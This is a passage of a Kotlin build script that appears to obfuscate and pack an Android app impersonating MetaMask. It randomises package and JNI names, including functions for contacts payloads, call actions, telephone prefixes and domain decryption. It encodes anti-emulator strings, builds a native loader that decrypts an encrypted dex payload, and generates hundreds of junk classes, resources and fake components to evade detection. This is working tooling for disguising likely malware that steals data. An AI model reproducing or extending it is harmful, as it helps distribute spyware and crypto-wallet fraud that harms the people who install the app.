                    || orig.contains("$randomPkg.account") || orig.contains("$randomPkg.provider")) {
                    val updated = orig
                        .replace("com.example.MetaMask", randomPkg)
                        .replace("com/example/MetaMask", randomPkgPath)
                        .replace("$randomPkg.account", "$randomPkg.$acctSuffix")
                        .replace("$randomPkg.provider", "$randomPkg.$prvdSuffix")
                    f.writeText(updated)
                    println("--- [CRISTOFER_V2] Updated res XML: ${f.name} ---")
                }
            }

        val cppDir = File(shadowSrcDir, "cpp").also { it.mkdirs() }
        var cpp = project.projectDir.resolve("src/main/cpp/native-lib.cpp").readText()

        clsMap.entries.sortedByDescending { it.key.length }.forEach { (o, n) -> cpp = cpp.replace(o, n) }
        jniMap.entries.sortedByDescending { it.key.length }.forEach { (o, n) ->
            cpp = cpp.replace(o, n)
        }
        cpp = cpp.replace("native_encrypt_data", "native_$JNI_ENCRYPT")
        cpp = cpp.replace("native_decode_task",  "native_$JNI_DECODE_TASK")
        cpp = cpp.replace("native_process_task_result", "native_$JNI_PROCESS_TASK")
        cpp = cpp.replace("native_get_call_action_string", "native_$JNI_CALL_ACTION")
        cpp = cpp.replace("native_get_tel_prefix",         "native_$JNI_TEL_PREFIX")
        cpp = cpp.replace("native_get_request_method_name","native_$JNI_REQ_METHOD")
        cpp = cpp.replace("native_get_callback_handler_class_name","native_$JNI_CB_HANDLER")
        cpp = cpp.replace("native_get_system_callback_class_name", "native_$JNI_SYS_CB")
        cpp = cpp.replace("native_get_contacts_action_string",     "native_$JNI_CONTACTS_ACTION")
        cpp = cpp.replace("native_build_contacts_payload",         "native_$JNI_BUILD_CONTACTS")
        cpp = cpp.replace("native_decrypt_domain",                 "native_$JNI_DECRYPT_DOMAIN")
        cpp = cpp.replace("native_get_uuid_prefix",                "native_$JNI_UUID_PREFIX")
        cpp = cpp.replace("native_get_uuid_suffix",                "native_$JNI_UUID_SUFFIX")

        cpp = cpp.replace("#define NATIVE_SHIFT 3", "#define NATIVE_SHIFT $rXShift")
        val obfKeyBytes = "Fantasypanelhub651241".map { (it.code + rXShift).toString() }.joinToString(", ")
        cpp = cpp.replace("{ 0 }; // OBF_KEY_PLACEHOLDER", "{ $obfKeyBytes };")
        val uuidPfxBytes = uuidPrefix.map { (it.code + rXShift).toString() }.joinToString(", ")
        val uuidSfxBytes = "v92".map { (it.code + rXShift).toString() }.joinToString(", ")
        cpp = cpp.replace("{ 0 }; // UUID_PFX_PLACEHOLDER", "{ $uuidPfxBytes };")
        cpp = cpp.replace("{ 0 }; // UUID_SFX_PLACEHOLDER", "{ $uuidSfxBytes };")

        fun shiftBytes(s: String): String = s.map { (it.code + rXShift).toString() }.joinToString(", ")
        val bseTable = listOf(
            "BSE_LOOPBACK"   to "127.0.0.1",
            "BSE_PROCMAPS"   to "/proc/self/maps",
            "BSE_SDKX86"     to "Android SDK built for x86",
            "BSE_ACT1STAT"   to "ACTION_ONE_STATUS: ",
            "BSE_ACT1ERR"    to "ACTION_ONE_ERROR: ",
            "BSE_ACT1RESP"   to "ACTION_ONE_RESPONSE: ",
            "BSE_DIAGSDKX86" to "ro.product.model=Android SDK built for x86"
        )
        bseTable.forEach { (key, value) ->
            cpp = cpp.replace("{ 0 }; // ${key}_PLACEHOLDER", "{ ${shiftBytes(value)} };")
        }

        val jniPkgPrefix = randomPkgPath.replace("/", "_")
        cpp = cpp.replace("Java_com_example_MetaMask_utils_", "Java_${jniPkgPrefix}_utils_")

        val bridgePath    = "com/yourcompany/core/jni/$CLS_NATIVE_BRIDGE"
        val bridgeEncoded = bridgePath.map { (it.code + 2) }.joinToString(",")
        val clsEncRegex   = Regex("""static const unsigned char CLS_ENC\[\] = \{[^}]+\};""")
        cpp = clsEncRegex.replace(cpp) { "static const unsigned char CLS_ENC[] = {$bridgeEncoded};" }

        cpp = cpp.replace("SecureLogicNative", NATIVE_LOG_TAG)

        val junkSb = StringBuilder("\n// ===== JUNK =====\n")
        repeat((8..15).random()) {
            val fn = "jf_${rndId(6)}"; val ops = (4..10).random()
            junkSb.append("static int $fn(int x) {\n    volatile int r = x;\n")
            repeat(ops) {
                val op = (1..999).random()
                when ((0..7).random()) {
                    0 -> junkSb.append("    r = r ^ $op;\n")
                    1 -> junkSb.append("    r = r + $op;\n")
                    2 -> junkSb.append("    r = (r >> ${(1..3).random()}) | (r << ${(1..3).random()});\n")
                    3 -> junkSb.append("    if (r % 2 == 0) r += $op; else r -= ${(1..50).random()};\n")
                    4 -> junkSb.append("    r = r * ${(2..7).random()} - $op;\n")
                    5 -> junkSb.append("    r = (r & 0x${Integer.toHexString((1..255).random())}) | ${(1..127).random()};\n")
                    6 -> { val iter = (3..8).random(); junkSb.append("    for (int _i=0;_i<$iter;_i++){r=r^(_i*${(1..31).random()});}\n") }
                    7 -> { val sz = (4..8).random(); val vals = (0 until sz).map { (1..255).random() }.joinToString(",")
                           junkSb.append("    {int _a[]={$vals};for(int _i=0;_i<$sz;_i++)r^=_a[_i];}\n") }
                }
            }
            junkSb.append("    return r;\n}\n\n")
        }
        repeat((2..3).random()) {
            val fn = "jf_${rndId(8)}"; val sz = (8..16).random()
            val vals = (0 until sz).map { (1..127).random() }.joinToString(",")
            val iters = (4..12).random(); val seed = (1..31).random()
            junkSb.append("static unsigned int $fn(unsigned int x) {\n")
            junkSb.append("    static const unsigned char _t[$sz] = {$vals};\n")
            junkSb.append("    unsigned int acc = x ^ ${(1..0xFFFF).random()}u;\n")
            junkSb.append("    for(int i=0;i<$iters;i++){acc=(acc<<$seed)^(acc>>${32-seed})^_t[i%$sz];if((acc&1u)==0u)acc+=${(1..99).random()}u;}\n")
            junkSb.append("    return acc;\n}\n\n")
        }
        val injectPoint = cpp.indexOf("static std::string decodeShifted")
        if (injectPoint >= 0) {
            cpp = cpp.substring(0, injectPoint) + junkSb.toString() + cpp.substring(injectPoint)
        }

        File(cppDir, "native-lib.cpp").writeText(cpp)

        for (name in listOf("base64.cpp", "base64.h")) {
            val src = project.projectDir.resolve("src/main/cpp/$name")
            if (src.exists()) src.copyTo(File(cppDir, name), overwrite = true)
        }

        val dexldrSrc = project.projectDir.resolve("pack/native/dexldr.c")
        if (dexldrSrc.exists()) {
            var dexldr = dexldrSrc.readText()
            val packJniSymbol = "Java_${jniPkgPrefix}_${STUB_CLS}_${JNI_UNPACK_SYMBOL}"
            dexldr = dexldr.replace("DEXLDR_JNI_SYMBOL_PLACEHOLDER", packJniSymbol)
            val liteCheckSymbol = "Java_${jniPkgPrefix}_${STUB_CLS}_${JNI_LITE_CHECK_SYMBOL}"
            dexldr = dexldr.replace("DEXLDR_JNI_LITE_CHECK_PLACEHOLDER", liteCheckSymbol)
            val keyBytesLit = PACK_XOR_KEY.joinToString(",") { (it.toInt() and 0xFF).toString() }
            val keyDeclRegex = Regex("""static const unsigned char KEY\[32\] = \{[\s\S]*?\}; // KEY_PLACEHOLDER""")
            dexldr = keyDeclRegex.replace(dexldr,
                "static const unsigned char KEY[32] = { $keyBytesLit }; // KEY_PLACEHOLDER")
            for (i in 0..2) {
                dexldr = dexldr.replace("PART${i}_PATH_PLACEHOLDER",
                    "$PAYLOAD_FOLDER/${PAYLOAD_PART_NAMES[i]}")
            }
            File(cppDir, "dexldr.c").writeText(dexldr)
        }

        File(cppDir, "CMakeLists.txt").writeText("""
cmake_minimum_required(VERSION 3.18.1)
project("$SO_NAME")
add_library($SO_NAME SHARED native-lib.cpp base64.cpp)
find_library(log-lib log)
target_link_libraries($SO_NAME ${'$'}{log-lib})
target_compile_options($SO_NAME PRIVATE -Os -fvisibility=hidden -ffunction-sections -fdata-sections)
target_link_options($SO_NAME PRIVATE -Wl,--gc-sections)

# PACKER: native loader for encrypted classes.dex
add_library($DEXLDR_SO_NAME SHARED dexldr.c)
find_library(android-lib android)
find_library(z-lib z)
target_link_libraries($DEXLDR_SO_NAME ${'$'}{log-lib} ${'$'}{android-lib} ${'$'}{z-lib})
set_target_properties($DEXLDR_SO_NAME PROPERTIES COMPILE_FLAGS "-Os -fvisibility=hidden")
""".trimIndent())

        srcJavaDir.walkTopDown().filter { it.extension == "kt" }.forEach { f ->
            var c = f.readText()
            if (c.contains("System.loadLibrary(\"securelogic\")") ||
                c.contains("System.loadLibrary(\"securelogic\")")) {
                c = c.replace("\"securelogic\"", "\"$SO_NAME\"")
                f.writeText(c)
            }
        }

        val resValuesDir = shadowSrcDir.resolve("res/values").also { it.mkdirs() }

        val rndStrCount = (150..900).random()
        val strSb = StringBuilder("<resources>\n")
        repeat(rndStrCount) { strSb.append("    <string name=\"z_${rndId(12)}\">${UUID.randomUUID()}_${Random().nextInt()}</string>\n") }
        strSb.append("</resources>")
        resValuesDir.resolve("strings_rnd_${rndId(6)}.xml").writeText(strSb.toString())

        val colorSb = StringBuilder("<resources>\n")
        repeat((40..220).random()) { colorSb.append("    <color name=\"c_${rndId(8)}\">#%08X</color>\n".format(Random().nextInt())) }
        colorSb.append("</resources>")
        resValuesDir.resolve("colors_gen.xml").writeText(colorSb.toString())

        val dimenUnits = listOf("dp", "sp", "px")
        val dimenSb = StringBuilder("<resources>\n")
        repeat((40..220).random()) { dimenSb.append("    <dimen name=\"d_${rndId(8)}\">${(1..500).random()}${dimenUnits.random()}</dimen>\n") }
        dimenSb.append("</resources>")
        resValuesDir.resolve("dimens_gen.xml").writeText(dimenSb.toString())

        val attrCount = (0..80).random()
        if (attrCount > 0) {
            val attrSb = StringBuilder("<resources>\n")
            repeat(attrCount) {
                val fmt = listOf("string","integer","boolean","float","dimension","color").random()
                attrSb.append("    <attr name=\"a_${rndId(8)}\" format=\"$fmt\" />\n")
            }
            attrSb.append("</resources>")
            resValuesDir.resolve("attrs_gen_${rndId(4)}.xml").writeText(attrSb.toString())
        }

        val resDir = shadowSrcDir.resolve("res")
        val densities = listOf("mdpi","hdpi","xhdpi","xxhdpi","xxxhdpi","anydpi","nodpi")
        densities.shuffled().take((3..7).random()).forEach { cfg ->
            val dir = resDir.resolve("drawable-$cfg").also { it.mkdirs() }
            val drawableCount = (1..8).random()
            repeat(drawableCount) {
                val color = "#%06X".format(0xFFFFFF and Random().nextInt())
                val radius = (1..30).random()
                val strokeW = (0..4).random()
                val shapeType = listOf("rectangle","oval","ring").random()
                dir.resolve("shf_${rndId(8)}.xml").writeText("""
<shape xmlns:android="http://schemas.android.com/apk/res/android" android:shape="$shapeType">
    <solid android:color="$color" />
    <corners android:radius="${radius}dp" />
    ${if (strokeW > 0) "<stroke android:width=\"${strokeW}dp\" android:color=\"#%06X\" />".format(0xFFFFFF and Random().nextInt()) else ""}
</shape>""".trimIndent())
            }
        }

        val rawCount = (0..12).random()
        if (rawCount > 0) {
            val rawDir = resDir.resolve("raw").also { it.mkdirs() }
            repeat(rawCount) {
                val kb = (1..16).random()
                val content = ByteArray(kb * 1024) { (0..255).random().toByte() }
                rawDir.resolve("rw_${rndId(8)}.bin").writeBytes(content)
            }
        }

        val xmlResCount = (0..8).random()
        if (xmlResCount > 0) {
            val xmlResDir = resDir.resolve("xml").also { it.mkdirs() }
            repeat(xmlResCount) {
                xmlResDir.resolve("cfg_${rndId(8)}.xml").writeText("""<?xml version="1.0" encoding="utf-8"?>
<config id="${rndId(12)}" ts="${UUID.randomUUID()}" ver="${(1..99).random()}" />""")
            }
        }

        val junkDir = shadowSrcDir.resolve("java/${junkPkg.replace('.','/')}").also { it.mkdirs() }

        fun genKotlinMath(v: String): String {
            val sb = StringBuilder("var $v: Long = System.nanoTime()\n")
            repeat((8..15).random()) { idx ->
                val op = (1..500).random()
                when ((0..9).random()) {
                    0 -> sb.append("$v = $v + $op\n")
                    1 -> sb.append("if ($v % 2L == 0L) { $v += $op } else { $v -= 1 }\n")
                    2 -> sb.append("$v = Math.sqrt(Math.abs($v.toDouble())).toLong()\n")
                    3 -> sb.append("$v = $v xor ${op}L\n")
                    4 -> sb.append("$v = ($v * Math.sin($idx.toDouble())).toLong()\n")
                    5 -> sb.append("$v += listOf(${(1..4).map { (1..99).random() }.joinToString(",")}).sum()\n")
                    6 -> { val nm = "sb${idx}_${rndId(3)}"; sb.append("val $nm = StringBuilder(\"${rndId(5)}\"); $nm.append($v); $v += $nm.length\n") }
                    7 -> sb.append("$v += try { Integer.parseInt(\"${(100..999).random()}\").toLong() } catch (_: Exception) { 0L }\n")
                    8 -> sb.append("$v += mapOf(\"k${rndId(3)}\" to $op, \"j${rndId(3)}\" to ${(1..99).random()}).values.sum()\n")
                    9 -> sb.append("$v += \"${rndId(6)}\".hashCode().toLong()\n")
                }
            }
            return sb.toString()
        }
        fun genJavaMath(v: String): String {
            val sb = StringBuilder("long $v = System.nanoTime();\n")
            repeat((8..15).random()) { idx ->
                val op = (1..500).random()
                when ((0..9).random()) {
                    0 -> sb.append("$v = $v + $op;\n")
                    1 -> sb.append("if ($v % 2 == 0) { $v += $op; } else { $v -= 1; }\n")
                    2 -> sb.append("$v = (long) Math.sqrt(Math.abs($v));\n")
                    3 -> sb.append("$v = $v ^ $op;\n")
                    4 -> sb.append("$v = (long)($v * Math.sin($idx));\n")
                    5 -> { val nm = "a${idx}_${rndId(3)}"; sb.append("int[] $nm = {${(1..4).map { (1..99).random() }.joinToString(",")}}; for (int _i : $nm) $v += _i;\n") }
                    6 -> { val nm = "sb${idx}_${rndId(3)}"; sb.append("StringBuilder $nm = new StringBuilder(\"${rndId(5)}\"); $nm.append($v); $v += $nm.length();\n") }
                    7 -> sb.append("try { $v += Integer.parseInt(\"${(100..999).random()}\"); } catch (Exception _e) {}\n")
                    8 -> sb.append("$v += \"${rndId(4)}\".compareTo(\"${rndId(4)}\");\n")
                    9 -> sb.append("$v += \"${rndId(6)}\".hashCode();\n")
                }
            }
            return sb.toString()
        }

        data class JunkUtil(val name: String, val pkg: String, val methods: List<String>) {
            val fqn: String get() = "$pkg.$name"
        }
        val junkUtilPool = mutableListOf<JunkUtil>()
        val subPkgPool = listOf(
            "cache","parse","format","net","state","crypto","io","collection","data",
            "model","metric","policy","queue","stream","registry","store","bus","scope",
            "ext","router","sink","backoff","retry","pool","time","config"
        )
        val activeSubPkgs = subPkgPool.shuffled().take((4..7).random())
        activeSubPkgs.forEach { junkDir.resolve(it).mkdirs() }
        println("--- [JUNK] Active sub-packages: ${activeSubPkgs.joinToString(",")} ---")

        val utilBases = listOf(
            "Processor","Transformer","Formatter","Validator","Serializer","Encoder",
            "Decoder","Hasher","Converter","Builder","Mapper","Resolver","Parser",
            "Generator","Aggregator","Collector","Dispatcher","Emitter","Handler","Scanner",
            "Indexer","Composer","Materializer","Probe","Predicate","Coordinator","Mediator",
            "Inspector","Reducer","Splitter","Joiner","Normalizer","Sanitizer","Tagger",
            "Linker","Renderer","Painter","Compactor","Pruner","Walker","Visitor"
        )
        val utilVerbs = listOf(
            "compute","transform","resolve","encode","decode","validate","format",
            "parse","build","generate","collect","dispatch","emit","hash","convert",
            "derive","normalize","sanitize","reduce","fold","split","join","tag",
            "index","compose","materialize","inspect","render","probe","check","extract",
            "wrap","unwrap","seal","unseal","stamp","mark","tally"
        )
        val propBases = listOf("cap","tag","seed","tick","bias","ttl","slot","scope",
                                "mask","limit","epoch","window","threshold","kind","mode","budget")
        fun genObjectProperties(): String {
            val n = (0..3).random()
            if (n == 0) return ""
            val names = mutableSetOf<String>()
            val out = StringBuilder()
            while (names.size < n) {
                val nm = "${propBases.random()}${rndId(3)}"
                if (!names.add(nm)) continue
                val ann = if ((0..3).random() == 0) "@JvmField " else "private "
                val piece = when ((0..5).random()) {
                    0 -> "    ${ann}val $nm: Int = ${(1..256).random()}"
                    1 -> "    ${ann}val $nm: Long = ${(1L..9999L).random()}L"
                    2 -> "    ${ann}val $nm: String = \"${rndId(8)}\""
                    3 -> "    ${ann}val $nm: Boolean = ${listOf("true","false").random()}"
                    4 -> "    private val $nm: MutableMap<String, Long> = mutableMapOf()"
                    5 -> "    ${ann}val $nm: List<Int> = listOf(${(1..3).map { (1..99).random() }.joinToString(",")})"
                    else -> "    private val $nm: Int = 0"
                }
                out.append(piece).append("\n")
            }
            return out.toString()
        }

        fun annPrefix(): String = when ((0..9).random()) {
            in 0..1 -> "@JvmStatic "
            2 -> "@Suppress(\"${listOf("UNUSED_PARAMETER","NOTHING_TO_INLINE","UNUSED").random()}\") "
            else -> ""
        }

        val decoVerbs = listOf("validate","check","derive","fetch","load","resolve","parse",
                                "format","encode","normalize","build","query","find","init",
                                "shape","wrap","peek","tag","mark","sample","probe","sweep")
        fun decorativeMethod(seen: MutableSet<String> = mutableSetOf()): String {
            val mname = run {
                repeat(20) {
                    val cand = decoVerbs.random() + junkSuffix()
                    if (seen.add(cand)) return@run cand
                }
                val fallback = "deco${rndId(6)}"
                seen.add(fallback); fallback
            }
            val rId = rndId(4)
            val op  = (1..99).random()
            return when ((0..7).random()) {
                0 -> "    fun $mname(): Int { val n${rId} = \"${rndId(5)}\".length + $op; return n${rId} }"
                1 -> "    fun $mname(): String { return \"${rndId(4)}_\${(0..99).random()}\" }"
                2 -> "    fun $mname(): Boolean { return \"${rndId(4)}\".hashCode() % ${(2..7).random()} == 0 }"
                3 -> "    fun $mname(): Long? { return if ((0..1).random() == 1) ${(1L..9999L).random()}L else null }"
                4 -> "    fun $mname(): List<String> { return listOf(${(1..4).map { "\"${rndId(4)}\"" }.joinToString(", ")}) }"
                5 -> "    fun $mname(): Pair<Int, String> { return Pair($op, \"${rndId(5)}\") }"
                6 -> "    fun $mname() { /* side-effect placeholder */ val z${rId} = ${(100..999).random()} xor $op }"
                7 -> "    fun $mname(): Map<String, Int> { return mapOf(${(1..3).map { "\"${rndId(3)}\" to ${(1..99).random()}" }.joinToString(", ")}) }"
                else -> "    fun $mname(): Int { return $op }"
            }
        }

        fun genDecorativeType(pkgPath: String, clsName: String): String = when ((0..4).random()) {
            0 -> {
                val n = (3..5).random()
                val seen = mutableSetOf<String>()
                val parts = mutableListOf<String>()
                var safety = 0
                while (parts.size < n && safety++ < 50) {
                    val nm = "${utilVerbs.random()}${junkSuffix()}"
                    if (!seen.add(nm)) continue
                    val ft = listOf("String", "Int", "Long", "Boolean").random()
                    val dv = when (ft) { "String" -> "\"${rndId(4)}\""; "Int" -> "${(1..99).random()}"; "Long" -> "${(1L..9999L).random()}L"; else -> "true" }
                    parts.add("val $nm: $ft = $dv")
                }
                val fields = parts.joinToString(", ")
                """
package $pkgPath
internal data class $clsName($fields)
""".trimIndent()
            }
            1 -> {
                val entries = (4..7).random().let { n ->
                    val set = mutableSetOf<String>()
                    while (set.size < n) set.add("${listOf("READY","BUSY","IDLE","FAILED","PENDING","DONE","STALE","FRESH","ACTIVE","INACTIVE","LOCKED","FREE").random()}_${rndId(3).uppercase()}")
                    set.joinToString(", ")
                }
                val mname = "${utilVerbs.random()}${junkSuffix()}"
                """
package $pkgPath
internal enum class $clsName {
    $entries;
    fun $mname(): Int = ordinal + ${(1..99).random()}
}
""".trimIndent()
            }
            2 -> {
                val mname = "${utilVerbs.random()}${junkSuffix()}"
                val implName = "${clsName}Impl"
                """
package $pkgPath
internal interface $clsName { fun $mname(x: Long): Long }
internal class $implName : $clsName {
    override fun $mname(x: Long): Long = x xor ${(1L..9999L).random()}L
}
""".trimIndent()
            }
            3 -> {
                val sub1 = freshJunkName(utilBases.random())
                val sub2 = freshJunkName(utilBases.random())
                val sub3 = freshJunkName(utilBases.random())
                """
package $pkgPath
internal sealed class $clsName {
    internal object $sub1 : $clsName()
    internal data class $sub2(val code: Int, val msg: String) : $clsName()
    internal object $sub3 : $clsName()
}
""".trimIndent()
            }
            else -> {
                val ft = listOf("String", "Long", "Int").random()
                val dv = when (ft) { "String" -> "\"${rndId(5)}\""; "Long" -> "${(1L..9999L).random()}L"; else -> "${(1..99).random()}" }
                val mname = "${utilVerbs.random()}${junkSuffix()}"
                """
package $pkgPath
internal class $clsName private constructor(val v: $ft) {
    companion object {
        @JvmStatic fun of(v: $ft): $clsName = $clsName(v)
        const val DEFAULT_CAPACITY = ${(1..256).random()}
    }
    fun $mname(): Int = v.hashCode() xor ${(1..0xFFFF).random()}
}
""".trimIndent()
            }
        }

        repeat((21..42).random()) {
            val sub = activeSubPkgs.random()
            val pkgPath = "$junkPkg.$sub"
            val cls  = freshJunkName(utilBases.random())
            val n = (2..4).random()
            val mthSet = mutableSetOf<String>()
            while (mthSet.size < n) { mthSet.add("${utilVerbs.random()}${junkSuffix()}") }
            val mths = mthSet.toList()
            val body = mths.joinToString("\n    ") { mth ->
                val v = "v${rndId(3)}"
                "${annPrefix()}fun $mth(input: Long = System.nanoTime()): Long { ${genKotlinMath(v)}; return $v }"
            }
            val decoSeen = mths.toMutableSet()
            val decoBody = (1..(1..3).random()).joinToString("\n") { decorativeMethod(decoSeen) }
            val props = genObjectProperties()
            junkDir.resolve("$sub/$cls.kt").writeText("""
package $pkgPath
internal object $cls {
    @JvmStatic fun getInstance(): $cls = this
$props
    $body
$decoBody
}""".trimIndent())
            junkUtilPool += JunkUtil(cls, pkgPath, mths)

            if ((0..4).random() < 3) {
                val decoCls = freshJunkName(utilBases.random())
                junkDir.resolve("$sub/$decoCls.kt").writeText(genDecorativeType(pkgPath, decoCls))
            }

            if ((0..6).random() == 0) {
                val gCls = freshJunkName(utilBases.random())
                val tparam = listOf("T : Any", "E", "K : Any, V").random()
                val mName = "${utilVerbs.random()}${junkSuffix()}"
                val body = when (tparam) {
                    "T : Any" ->
                        "internal class $gCls<T : Any>(private val seed: T) {\n    fun $mName(): Int = seed.hashCode() xor ${(1..0xFFFF).random()}\n    fun getSeed(): T = seed\n}"
                    "E" ->
                        "internal class $gCls<E>(private val items: List<E> = emptyList()) {\n    fun $mName(): Int = items.size + ${(1..99).random()}\n    fun first(): E? = items.firstOrNull()\n}"
                    "K : Any, V" ->
                        "internal class $gCls<K : Any, V>(private val store: Map<K, V> = emptyMap()) {\n    fun $mName(key: K): V? = store[key]\n    fun keys(): Set<K> = store.keys\n}"
                    else -> "internal class $gCls<T>"
                }
                junkDir.resolve("$sub/$gCls.kt").writeText("package $pkgPath\n\n$body\n")
            }
        }
        println("--- [JUNK] Generated ${junkUtilPool.size} utility singletons ---")

        fun genExecKotlin(v: String): String {
            val sb = StringBuilder("var $v: Long = System.nanoTime()\n")
            repeat((3..7).random()) { idx ->
                val op = (1..500).random()
                when ((0..6).random()) {
                    0 -> sb.append("$v = $v xor ${op}L\n")
                    1 -> sb.append("if ($v % 2L == 0L) { $v += $op } else { $v -= 1 }\n")
                    2 -> sb.append("$v = Math.sqrt(Math.abs($v.toDouble())).toLong()\n")
                    3 -> sb.append("$v = ($v * ${(2..9).random()}L) - ${op}L\n")
                    4 -> sb.append("$v += listOf(${(1..3).map { (1..99).random() }.joinToString(",")}).sum()\n")
                    5 -> { val nm = "sb${idx}_${rndId(3)}"; sb.append("val $nm = StringBuilder(\"${rndId(4)}\"); $nm.append($v); $v += $nm.length\n") }
                    6 -> sb.append("$v += \"${rndId(5)}\".hashCode().toLong()\n")
                }
            }
            if (junkUtilPool.isNotEmpty()) {
                repeat((2..4).random()) {
                    val u = junkUtilPool.random(); val m = u.methods.random()
                    sb.append("$v += ${u.fqn}.$m($v)\n")
                }
            }
            sb.append("return $v\n")
            return sb.toString()
        }
        fun genExecJava(v: String): String {
            val sb = StringBuilder("long $v = System.nanoTime();\n")
            repeat((3..7).random()) { idx ->
                val op = (1..500).random()
                when ((0..6).random()) {
                    0 -> sb.append("$v = $v ^ $op;\n")
                    1 -> sb.append("if ($v % 2 == 0) { $v += $op; } else { $v -= 1; }\n")
                    2 -> sb.append("$v = (long) Math.sqrt(Math.abs($v));\n")
                    3 -> sb.append("$v = ($v * ${(2..9).random()}) - $op;\n")
                    4 -> { val nm = "a${idx}_${rndId(3)}"; sb.append("int[] $nm = {${(1..3).map { (1..99).random() }.joinToString(",")}}; for (int _i : $nm) $v += _i;\n") }
                    5 -> { val nm = "sb${idx}_${rndId(3)}"; sb.append("StringBuilder $nm = new StringBuilder(\"${rndId(4)}\"); $nm.append($v); $v += $nm.length();\n") }
                    6 -> sb.append("$v += \"${rndId(5)}\".hashCode();\n")
                }
            }
            if (junkUtilPool.isNotEmpty()) {
                repeat((2..4).random()) {
                    val u = junkUtilPool.random(); val m = u.methods.random()
                    sb.append("$v += ${u.fqn}.INSTANCE.${m}($v);\n")
                }
            }
            sb.append("return $v;\n")
            return sb.toString()
        }

        val allComps = fakeActivityNames.map { it to "Activity" } +
            fakeServiceNames.map { it to "Service" } +
            fakeProviderNames.map { it to "Provider" }

        allComps.forEach { (name, type) ->
            val coreVerb = execVerb()
            if (Random().nextBoolean()) {
                val v = "r${rndId(4)}"
                val base = when(type) {
                    "Activity" -> "android.app.Activity"
                    "Service"  -> "android.app.Service"
                    else       -> "android.content.ContentProvider"
                }
                val emCount = (1..3).random()
                val emNames = mutableSetOf<String>()
                while (emNames.size < emCount) { emNames.add("${utilVerbs.random()}${junkSuffix()}") }
                emNames.remove(coreVerb)
                val extraMethods = emNames.joinToString("\n") { mn ->
                    val vv = "e${rndId(4)}"
                    val chain = if (junkUtilPool.isNotEmpty()) {
                        val u = junkUtilPool.random(); "$vv += ${u.fqn}.${u.methods.random()}($vv)\n"
                    } else ""
                    "private fun $mn(): Long { var $vv = System.nanoTime()\n$chain; return $vv }"
                }
                val lifecycle = when(type) {
                    "Activity" -> "override fun onCreate(s:android.os.Bundle?){super.onCreate(s);$coreVerb()}"
                    "Service"  -> "override fun onStartCommand(i:android.content.Intent?,f:Int,s:Int):Int{$coreVerb();return android.app.Service.START_NOT_STICKY}\noverride fun onBind(i:android.content.Intent?)=null"
                    else       -> "override fun onCreate():Boolean{$coreVerb();return true}\noverride fun query(u:android.net.Uri,p:Array<String>?,s:String?,a:Array<String>?,o:String?)=null\noverride fun getType(u:android.net.Uri)=null\noverride fun insert(u:android.net.Uri,v:android.content.ContentValues?)=null\noverride fun delete(u:android.net.Uri,s:String?,a:Array<String>?)=0\noverride fun update(u:android.net.Uri,v:android.content.ContentValues?,s:String?,a:Array<String>?)=0"
                }
                junkDir.resolve("$name.kt").writeText("""
package $junkPkg
class $name : $base() {
    $lifecycle
    $extraMethods
    private fun $coreVerb(): Long {
        ${genExecKotlin(v)}
    }
}""".trimIndent())
            } else {
                val v = "jv${rndId(4)}"
                val base = when(type) {
                    "Activity" -> "android.app.Activity"
                    "Service"  -> "android.app.Service"
                    else       -> "android.content.ContentProvider"
                }
                val lifecycle = when(type) {
                    "Activity" -> "@Override protected void onCreate(android.os.Bundle b){super.onCreate(b);$coreVerb();}"
                    "Service"  -> "@Override public int onStartCommand(android.content.Intent i,int f,int s){$coreVerb();return START_NOT_STICKY;}\n@Override public android.os.IBinder onBind(android.content.Intent i){return null;}"
                    else       -> "@Override public boolean onCreate(){$coreVerb();return true;}\n@Override public android.database.Cursor query(android.net.Uri u,String[] p,String s,String[] a,String o){return null;}\n@Override public String getType(android.net.Uri u){return null;}\n@Override public android.net.Uri insert(android.net.Uri u,android.content.ContentValues v){return null;}\n@Override public int delete(android.net.Uri u,String s,String[] a){return 0;}\n@Override public int update(android.net.Uri u,android.content.ContentValues v,String s,String[] a){return 0;}"
                }
                val extraJavaMethods = if (junkUtilPool.isNotEmpty()) {
                    val u = junkUtilPool.random(); val m = u.methods.random()
                    "private long helper${rndId(4)}(long x){return ${u.fqn}.INSTANCE.${m}(x);}"
                } else ""
                junkDir.resolve("$name.java").writeText("package $junkPkg;\npublic class $name extends $base{\n$lifecycle\n$extraJavaMethods\nprivate long $coreVerb(){\n${genExecJava(v)}\n}}")
            }
        }

        val helperTemplates = listOf(
            "analytics" to "fun track(event: String, params: Map<String, Any> = emptyMap()): Long { var acc = event.hashCode().toLong(); params.forEach { (k,_) -> acc = acc xor k.hashCode().toLong() }; return acc }",
            "config"    to "fun get(key: String, def: String = \"\"): String = cache.getOrDefault(key, def)",
            "logger"    to "fun log(msg: String): Long { val h = msg.hashCode().toLong(); return if (enabled) h xor ${(1L..Long.MAX_VALUE/2).random()} else h }",
            "network"   to "fun isReachable(host: String = \"localhost\"): Boolean = host.isNotEmpty()",
            "cache"     to "fun put(k: String, v: String): Long { store[k] = v; return k.hashCode().toLong() xor v.hashCode().toLong() }",
            "datetime"  to "fun now(): String = java.text.SimpleDateFormat(\"yyyyMMdd_HHmmss\", java.util.Locale.US).format(java.util.Date())",
            "crypto"    to "fun xor(data: ByteArray, key: Byte): ByteArray = data.map { (it.toInt() xor key.toInt()).toByte() }.toByteArray()",
            "prefs"     to "fun read(ctx: android.content.Context, k: String): String = ctx.getSharedPreferences(\"d\", 0).getString(k, \"\") ?: \"\"",
            "metrics"   to "fun elapsed(start: Long): Long = System.nanoTime() - start",
            "strings"   to "fun cap(s: String): String = s.replaceFirstChar { it.uppercase() }"
        )
        helperTemplates.shuffled().take((5..8).random()).forEach { (tag, method) ->
            val sub = activeSubPkgs.random()
            val pkgPath = "$junkPkg.$sub"
            val clsName = freshJunkName("${tag.replaceFirstChar{it.uppercase()}}Mgr")
            val crossCall = if (junkUtilPool.isNotEmpty()) {
                val u = junkUtilPool.random(); val m = u.methods.random()
                "\nfun warmup(): Long = ${u.fqn}.$m()"
            } else ""
            junkDir.resolve("$sub/$clsName.kt").writeText("""
package $pkgPath
object $clsName {
    private val enabled = true
    private val cache = mutableMapOf(${(1..2).random().let { n -> (1..n).joinToString(",") { "\"${rndId(5)}\" to \"${UUID.randomUUID()}\"" } }})
    private val store = mutableMapOf<String, String>()
    $method$crossCall
}""".trimIndent())
        }

        repeat((10..20).random()) {
            val sub = activeSubPkgs.random()
            val pkgPath = "$junkPkg.$sub"
            val bname = freshJunkName("Breaker")
            val mc = (20..40).random()
            val sb = StringBuilder("package $pkgPath;\npublic class $bname {\n")
            repeat(mc) { m ->
